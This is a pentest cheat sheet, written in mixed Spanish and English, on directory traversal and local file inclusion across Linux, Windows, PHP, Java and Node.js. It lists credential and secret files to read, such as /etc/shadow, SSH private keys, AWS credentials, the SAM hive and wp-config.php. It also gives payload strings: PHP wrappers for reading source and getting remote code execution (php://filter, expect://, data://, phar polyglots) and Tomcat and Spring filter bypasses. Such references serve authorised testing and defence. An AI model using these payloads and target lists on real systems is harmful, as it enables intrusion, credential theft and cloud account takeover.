---
aliases:
  - Path Traversal Linux Targets
  - Path Traversal Windows Targets
  - PHP Wrappers
tags:
  - type/cheatsheet
  - vuln/path-traversal
  - vuln/lfi
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Directory Traversal]]'
  - '[[File Inclusion]]'
---
# Directory Traversal - Vectores por OS / Stack

***

## Linux Objetivos de Alto Valor

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `/etc/passwd` | Users + UIDs | Standard probe (legible para todos). |
| `/etc/shadow` | Password hashes | Root-only. |
| `/etc/hostname` | Hostname | Network info. |
| `/etc/hosts` | Host mapping | Internal hostnames. |
| `/etc/issue` | OS banner | Distro version. |
| `/etc/os-release` | OS metadata | Distro identification. |
| `/etc/group` | Groups | User group memberships. |
| `/etc/sudoers` | sudo rules | Root-only typically. |
| `/etc/crontab` | System cron jobs | Scheduled tasks. |
| `/etc/cron.d/*` | Cron jobs per package | Per-config. |
| `/proc/self/environ` | Process env vars | Creds en deploys. |
| `/proc/self/cmdline` | Command-line args | `--password=...` typical. |
| `/proc/self/status` | Process status | UID, GID, etc. |
| `/proc/self/maps` | Memory map | Module locations. |
| `/proc/self/cwd/X` | Current working dir + relative | Symlink trick. |
| `/proc/self/fd/N` | Open file descriptors | Active files. |
| `/proc/version` | Kernel version | Exploit selection. |
| `/proc/cpuinfo` | CPU info | Banner. |
| `/proc/mounts` | Mounted filesystems | Container detection. |
| `~/.bash_history` | Shell history | User commands. |
| `~/.ssh/id_rsa` | SSH private key | Direct access. |
| `~/.ssh/authorized_keys` | SSH allowed keys | Add own. |
| `~/.aws/credentials` | AWS creds | Cloud takeover. |
| `~/.docker/config.json` | Docker registry creds | Push images. |
| `~/.git-credentials` | Git creds | Repo access. |
| `~/.npmrc` | NPM tokens | Publish packages. |
| `/var/log/apache2/access.log` | Apache logs | Log poisoning candidate. |
| `/var/log/nginx/access.log` | nginx logs | Same. |
| `/var/log/auth.log` | SSH login attempts | Auth events. |
| `/var/lib/jenkins/secrets.xml` | Jenkins secrets | Cipher key. |
| `/var/www/html/wp-config.php` | WordPress DB creds | Direct DB access. |
| `/var/www/html/config.php` | Generic PHP config | Apps custom. |
^pt-stack-linux

___

## Windows Objetivos de Alto Valor

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `C:\\windows\\win.ini` | Windows ini | Legible probe. |
| `C:\\windows\\system32\\drivers\\etc\\hosts` | Hosts file | Network info. |
| `C:\\windows\\system.ini` | Legacy config | Same. |
| `C:\\windows\\system32\\config\\sam` | SAM database | Hashes — locked typically. |
| `C:\\windows\\system32\\config\\system` | System hive | Boot key. |
| `C:\\windows\\system32\\config\\security` | Security policy | Locked typically. |
| `C:\\windows\\repair\\sam` | Old SAM backup | Sometimes accessible. |
| `C:\\windows\\debug\\netsetup.log` | Network setup log | Domain join info. |
| `C:\\inetpub\\wwwroot\\web.config` | IIS app config | Connection strings. |
| `C:\\inetpub\\logs\\LogFiles\\` | IIS logs | Same as Apache. |
| `C:\\Program Files\\` (paths) | Installed software | Reconnaissance. |
| `C:\\Users\\Administrator\\Desktop\\` | User files | Direct. |
| `C:\\Users\\<user>\\AppData\\Roaming\\` | User configs | Per-app data. |
| `C:\\Users\\<user>\\NTUSER.DAT` | User registry | Locked typically. |
| Environment variables | `%SYSTEMROOT%\\win.ini` | Variable expand. |
| UNC paths | `\\\\?\\C:\\windows\\win.ini` | UNC syntax. |
| WSL paths | `\\\\wsl$\\Distro\\etc\\passwd` | WSL filesystem from Windows. |
| Tomcat | `C:\\tomcat\\conf\\tomcat-users.xml` | Tomcat creds. |
| .NET appsettings | `C:\\inetpub\\wwwroot\\appsettings.json` | Modern .NET config. |
| Common XAMPP | `C:\\xampp\\apache\\conf\\httpd.conf` | XAMPP. |
| WAMP | `C:\\wamp\\www\\config.inc.php` | WAMP. |
^pt-stack-windows

___

## PHP Wrappers (Path Traversal + LFI)

| **Wrapper** | **Payload** | **Uso** |
|:---:|:---:|:---:|
| `file://` | `file:///etc/passwd` | Standard file URI. |
| `php://filter base64-encode` | `php://filter/convert.base64-encode/resource=/var/www/index.php` | Read PHP source as base64. |
| `php://filter ROT13` | `php://filter/read=string.rot13/resource=index.php` | Light obfuscation. |
| `php://filter chained` | `php://filter/convert.base64-encode\|convert.base64-decode\|.../resource=...` | Multi-stage. |
| `php://input` | POST body como input | Combine con LFI. |
| `php://temp` | Temporary stream | Edge. |
| `php://memory` | In-memory stream | Edge. |
| `data://text/plain,...` | Data URI | RCE if executed. |
| `data://text/plain;base64,...` | Base64 encoded | Same. |
| `expect://command` | Run command (PHP expect ext) | RCE direct. |
| `phar://path/file.phar` | Phar deserialization trigger | Combo Insecure Deserialization. |
| `phar://uploaded.jpg/test` | Polyglot Phar/Image | Bypass file upload. |
| `zip://file.zip#path/inside` | Read inside ZIP | Path traversal in ZIP. |
| `compress.zlib://file.gz` | gzip stream | Same. |
| `compress.bzip2://file.bz2` | bzip2 stream | Same. |
| `glob://*.php` | Glob expansion | List files. |
| `ftp://anonymous:x@server/file` | FTP access | Network LFI. |
| `ssh2://` (PHP ssh2 ext) | SSH access | Edge. |
^pt-stack-php-wrappers

___

## Java Path Handling

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Java `File.getCanonicalPath()` | Resolves `../` correctly | Safe if used. |
| Tomcat `..;/` | `..;/admin` bypasses filter | Tomcat-specific. |
| Spring static resource | `/static/..%2f..%2fconfig.properties` | Static dir bypass. |
| Spring `org.apache.catalina.connector.Request` | Path quirks | Custom. |
| Java NIO `Paths.get()` | Resolves correctly | Use with `normalize()`. |
| Java `URLClassLoader` | `getResource("/../path")` | Resource path traversal. |
| Java `getResourceAsStream` | Same. | Direct file load. |
| Tomcat servlet path | `/servlet/<malicious>` | Servlet routing. |
| `ServletContext.getRealPath()` | `getRealPath("../etc/passwd")` | If user input passed. |
| WebLogic `_async` | WebLogic-specific | Edge. |
| ZIP slip Java | `Zip4j` lib old | CVE history. |
| Apache Commons FileUpload | Filename traversal | Old versions. |
| JSP `<jsp:include>` | Include directives with traversal | Direct. |
^pt-stack-java

___

## Node.js / Express Path Quirks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `path.join(base, userInput)` | `path.join("/var/www", "../etc/passwd")` resolves to `/etc/passwd` | Vulnerable to traversal. |
| `path.resolve(base, userInput)` | Same risk | Same. |
| `fs.readFile(userInput)` | Direct user input | Catastrophic. |
| Express static middleware | `app.use(express.static('/path'))` | If middleware before auth check. |
| `res.sendFile(userInput)` | Direct sendFile con user path | Vulnerable. |
| `serve-static` middleware | Same risks | Common Express stack. |
| Path module `path.normalize()` | Doesn't prevent absolute paths | Need additional check. |
| Win/Unix path differences | `path.win32` vs `path.posix` | Per-OS. |
| Symlink following | `fs.realpath()` follows symlinks | Symlink TOCTOU. |
| `require(userInput)` | `require("../etc/passwd")` | RCE if path traversal in require. |
| `import(userInput)` | Dynamic import — same | Modern ES. |
| Node fs API on Windows | Quirky path handling | Per-OS. |
| Express route param | `app.get('/file/:filename', ...)` con userinput → readFile | Standard. |
^pt-stack-node

***
